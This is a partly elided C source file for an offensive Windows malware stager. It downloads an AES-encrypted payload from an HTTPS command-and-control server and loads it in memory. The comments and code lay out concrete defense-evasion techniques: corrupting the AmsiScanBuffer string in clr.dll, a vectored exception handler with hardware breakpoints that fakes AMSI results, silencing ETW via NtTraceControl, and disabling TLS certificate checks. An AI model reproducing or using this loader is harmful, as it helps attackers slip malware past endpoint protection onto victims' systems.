/*
 * stager_remote.c — single-file Crystal Palace PICO loader (HTTPS download)
 *
 * Delivery: stager.exe only — payload.dat is downloaded from HTTPS server
 *
 ...
 *    VirtualProtect on clr.dll only — NOT monitored by ETW-TI.
 *  Layer 2 (fallback): VEH + HWBP on AmsiScanBuffer + NtTraceControl.
 *    Process-wide VEH, HWBP propagated to all threads via monitor.
 *    Catches any edge case where Layer 1 didn't fire.
 *
 * ETW bypass:
 *  - DR1 = NtTraceControl → return STATUS_SUCCESS (ETW silenced)
 *  - CLR string corruption prevents AMSI init → no AMSI ETW events
 *
 * Evasion profile:
 *  - Single EXE ~20 KB, entropy ~5.0 — no embedded payload
 *  - HTTPS download blends with normal web traffic on port 443
 *  - AES-256-CBC via BCrypt — legitimate crypto API
 ...
 *  - TLS certificate validation disabled (self-signed C2 cert)
 *  - Zero memory patches on amsi.dll or ntdll.dll
 *
 * Build:
 *  x86_64-w64-mingw32-gcc -Wall -Os -mwindows -ffunction-sections \
 *      -fdata-sections -o stager.exe stager_remote.c resource.o \
 ...
 *
 * When clr.dll is loaded into the process, our callback fires BEFORE
 * CLR initialization completes. We scan clr.dll's memory for the string
 * "AmsiScanBuffer" in .rdata and overwrite the first byte.
 * CLR then fails GetProcAddress(amsi, "XmsiScanBuffer") → fail open →
 * AMSI never initializes for reflective assembly loads.
 *
 * Detection surface: VirtualProtect on clr.dll .rdata — Defender does
 * NOT monitor clr.dll via ETW-TI (only amsi.dll, ntdll.dll).
 * ══════════════════════════════════════════════════════════════════════════ */
...
/* ══════════════════════════════════════════════════════════════════════════
 * LAYER 2 — VEH + HWBP fallback (covers edge cases)
 *
 * VEH is process-wide: intercepts EXCEPTION_SINGLE_STEP from any thread.
 * HWBP monitor propagates DR0/DR1 to all threads every 500ms.
 * If Layer 1 already corrupted clr.dll, AmsiScanBuffer is never called
 * and HWBP never fires — the two layers are independent.
 * ══════════════════════════════════════════════════════════════════════════ */
...
static LONG CALLBACK veh_handler(PEXCEPTION_POINTERS ep)
{
    ...
    if (g_amsi_scan_buf && (PVOID)ctx->Rip == g_amsi_scan_buf) {
        ctx->Rax = (DWORD64)0x80070057;  /* E_INVALIDARG */
...
int WINAPI WinMain(HINSTANCE hi, HINSTANCE hp, LPSTR lp, int ns)
{
    ...
    /* LAYER 1: register DLL load callback BEFORE anything loads clr.dll */
    ...
    /* LAYER 2: start HWBP monitor as fallback */
